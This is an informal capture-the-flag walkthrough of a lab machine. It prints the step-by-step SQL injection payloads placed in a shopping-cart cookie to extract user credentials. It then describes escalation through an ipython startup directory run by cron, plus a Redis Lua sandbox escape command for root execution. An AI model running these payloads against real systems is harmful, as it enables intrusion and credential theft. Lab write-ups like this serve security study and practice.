One of the great box

look for ==subdomain==

on doing checkout we are redirected to checkout subdomain with cokoie

it was in ==b64 so we did it in json== and did

```
custom_cart={"B4GTLMT3":"2"}
we put '    -> custom_cart={"B4GTLMT3'":"2"}   #showed 0 in cart means vuln
custom_cart={"B4GTLMT3'-- -":"2"}   #showed 2 agian which means we good
check for columns ->   custom_cart={"B4GTLMT3'union select 1,2,3 -- -":"2"} it returned 2 again means good
custom_cart={"B4'union select 1,user(),3 -- -":"2"}  ->  got our username 
custom_cart={"B4' union select 1,username,322 from checkout.user where id=1-- -":"2"}   -> guessed tb name and got username
custom_cart={"B4' union select 1,password,322 from checkout.user where id=1-- -":"2"}  -> password
```

BEST ==SQLI==

now we got in

==pspy== .. told us ==ipython== running as cron and told us the path which was /opt/some

we ==cant write== there but we ==can copy ==

make required dir in /dev/shm with proper permission and ==cp -R /  in opt==

```
mkdir -m 777 /opt/scripts_review/profile_default/startup   -> set permission and it was required to be same
now make any python file  with payload noral from rvshells
and cp -R / in opt and got shell
```

now root

doing ==ps -ef==

==redis==-cli was running as root

need auth

we were ==sysadmin so check groups==

`find / -group sysadmin 2>/dev/null`

it make connection on localhost .. dwld it and set up nc on req port got creds

now type this to get root shell

```
eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
```
